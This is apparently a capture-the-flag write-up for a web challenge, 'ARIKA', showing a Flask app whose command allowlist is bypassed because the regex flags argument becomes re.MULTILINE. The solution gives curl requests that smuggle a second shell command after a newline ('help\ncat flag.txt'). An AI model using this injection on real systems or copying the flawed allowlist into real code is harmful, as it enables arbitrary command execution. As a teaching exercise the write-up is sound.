# ARIKA

> Web

```text
The Arika ransomware group likes to look slick and spiffy with their cool green-on-black terminal style website... but it sounds like they are worried about some security concerns of their own!
```

## Files Provided

```text
arika
├── app.py
├── commands
│   ├── contact.sh
│   ├── help.sh
│   ├── hostname.sh
│   ├── leaks.sh
│   ├── news.sh
│   └── whoami.sh
├── Dockerfile
├── flag.txt
├── requirements.txt
├── static
│   ├── style.css
│   └── terminal.js
└── templates
    └── index.html
```

`app.py`:

```python
import os, re
import subprocess
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

ALLOWLIST = ["leaks", "news", "contact", "help",
             "whoami", "date", "hostname", "clear"]

def run(cmd):
    try:
        proc = subprocess.run(["/bin/sh", "-c", cmd],capture_output=True,text=True,check=False)
        return proc.stdout, proc.stderr, proc.returncode
    except Exception as e:
        return "", f"error: {e}\n", 1

@app.get("/")
def index():
    return render_template("index.html")

@app.post("/")
def exec_command():
    data = request.get_json(silent=True) or {}
    command = data.get("command") or ""
    command = command.strip()
    if not command:
        return jsonify(ok=True, stdout="", stderr="", code=0)
    if command == "clear":
        return jsonify(ok=True, stdout="", stderr="", code=0, clear=True)
    if not any([ re.match(r"^%s$" % allowed, command, len(ALLOWLIST)) for allowed in ALLOWLIST]):
        return jsonify(ok=False, stdout="", stderr="error: Run 'help' to see valid commands.\n", code=2)
    
    stdout, stderr, code = run(command)
    return jsonify(ok=(code == 0), stdout=stdout, stderr=stderr, code=code)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False)
```

## Solution

Entering a command sends the following POST request (copied as curl):

```shell
curl 'https://84cfa953.proxy.coursestack.com/'   -H 'accept: */*'   -H 'accept-language: en-US,en;q=0.9,hi;q=0.8'   -H 'content-type: application/json'   -b '_ga=GA1.1.523306962.1759840361; _ga_6F3S5QGGQM=GS2.1.s1759840360$o1$g1$t1759840372$j48$l0$h0; token=84cfa953-23b5-4174-ad60-9b9e5d1ec231_1_6405b41753b2957c8e850fc7087acb01e2ac5b8fdcdc615695bfcd3706d5abfb'   -H 'origin: https://84cfa953.proxy.coursestack.com'   -H 'priority: u=1, i'   -H 'referer: https://84cfa953.proxy.coursestack.com/'   -H 'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"'   -H 'sec-ch-ua-mobile: ?0'   -H 'sec-ch-ua-platform: "Linux"'   -H 'sec-fetch-dest: empty'   -H 'sec-fetch-mode: cors'   -H 'sec-fetch-site: same-origin'   -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'   --data-raw '{"command":"help"}'
```

The whitelisting code in `server.py`:

```python
if not any([ re.match(r"^%s$" % allowed, command, len(ALLOWLIST)) for allowed in ALLOWLIST]):
```

The argument `len(ALLOWLIST)` is passed where [flags](https://docs.python.org/3/library/re.html#flags) are passed.

The length is **8**, which corresponds to **re.MULTILINE**. The anchors `^` and `$` now match start and end of *any line*, not the *whole string*

Testing the approach:

```shell
curl .... --data-raw '{"command":"help\nnews"}'
```

This prints the output of both the commands

```shell
curl .... --data-raw '{"command":"help\ncat flag.txt"}'
```

This prints the flag!
